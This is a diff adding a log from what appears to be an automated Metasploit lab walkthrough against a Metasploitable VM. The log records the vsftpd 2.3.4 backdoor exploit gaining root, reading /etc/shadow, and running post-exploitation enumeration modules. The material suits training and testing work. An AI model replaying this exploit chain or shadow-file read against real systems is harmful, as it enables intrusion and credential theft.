@@ -1,0 +1,22 @@
+2026-04-02 12:03:41 INFO - Delay before commands: 0 seconds
+2026-04-02 12:03:41 WARNING - Debug: 'Note: the vsftpd exploit can take up to 30 seconds. Please be patient.'
+2026-04-02 12:03:41 INFO - Executing Msf-Module: 'exploit/unix/ftp/vsftpd_234_backdoor'
+2026-04-02 12:04:13 INFO - Executing Msf-Session-Command: 'id'
+2026-04-02 12:04:13 INFO - Executing a msf-command
+2026-04-02 12:04:14 WARNING - Debug: 'Shell session user: uid=0(root) gid=0(root)
+'
+2026-04-02 12:04:14 INFO - Executing Msf-Session-Command: 'uname -a'
+2026-04-02 12:04:14 INFO - Executing a msf-command
+2026-04-02 12:04:15 WARNING - Debug: 'Target kernel: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+'
+2026-04-02 12:04:15 INFO - Executing Msf-Session-Command: 'hostname'
+2026-04-02 12:04:15 INFO - Executing a msf-command
+2026-04-02 12:04:16 INFO - Executing Msf-Session-Command: 'cat /etc/shadow'
+2026-04-02 12:04:16 INFO - Executing a msf-command
+2026-04-02 12:04:18 WARNING - Debug: 'Shadow file contents captured. We have root.'
+2026-04-02 12:04:18 WARNING - Debug: 'Running post module. Metasploit session ID: 6'
+2026-04-02 12:04:18 INFO - Executing Msf-Module: 'post/linux/gather/enum_network'
+2026-04-02 12:04:22 INFO - Executing Msf-Module: 'post/linux/gather/checkvm'
+2026-04-02 12:04:23 WARNING - Debug: 'Walkthrough complete. Check output.log for results'
+2026-04-02 12:04:23 WARNING - Cleaning up session stores
+2026-04-02 12:04:23 INFO - Msf session 6 stopped successfully.
